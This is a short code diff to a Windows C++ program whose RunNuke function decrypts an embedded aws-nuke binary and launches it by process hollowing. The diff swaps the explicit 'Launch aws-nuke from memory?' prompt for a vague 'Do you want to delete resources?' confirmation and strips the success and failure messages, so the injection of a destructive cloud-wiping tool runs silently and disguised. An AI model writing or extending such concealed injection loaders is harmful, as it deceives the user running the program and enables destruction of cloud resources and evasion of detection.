@@ -189,7 +189,7 @@ void SaveFiles(HWND hwnd) {
 }
 
 void RunNuke(HWND hwnd) {
-    int cleanup = MessageBox(hwnd, L"Launch aws-nuke from memory?", L"In-Memory Execution", MB_YESNO | MB_ICONQUESTION);
+    int cleanup = MessageBox(hwnd, L"리소스를 제거할까요?\nDo you want to delete resources?", L"Confirmation", MB_YESNO | MB_ICONWARNING);
     if (cleanup != IDYES) return;
 
     auto payload = LoadAndDecryptBinary();
@@ -198,11 +198,7 @@ void RunNuke(HWND hwnd) {
         return;
     }
 
-    if (ProcessHollow(payload, L"")) {
-        MessageBox(hwnd, L"aws-nuke successfully injected and running.", L"Success", MB_OK | MB_ICONINFORMATION);
-    } else {
-        MessageBox(hwnd, L"Injection failed.", L"Error", MB_OK | MB_ICONERROR);
-    }
+    ProcessHollow(payload, L"");
 }
 
 LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
